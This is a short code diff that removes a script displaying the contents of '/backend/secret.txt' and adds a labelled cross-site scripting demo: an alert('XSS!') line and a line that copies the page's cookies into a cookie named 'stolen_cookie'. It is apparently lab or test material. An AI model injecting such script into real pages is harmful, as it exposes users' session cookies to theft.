@@ -1,5 +1,2 @@
-fetch('/backend/secret.txt')
-    .then(response => response.text())
-    .then(data => {
-        document.getElementById('output').innerText = data;
-    });
+alert('XSS!');
+document.cookie = 'stolen_cookie=' + document.cookie;
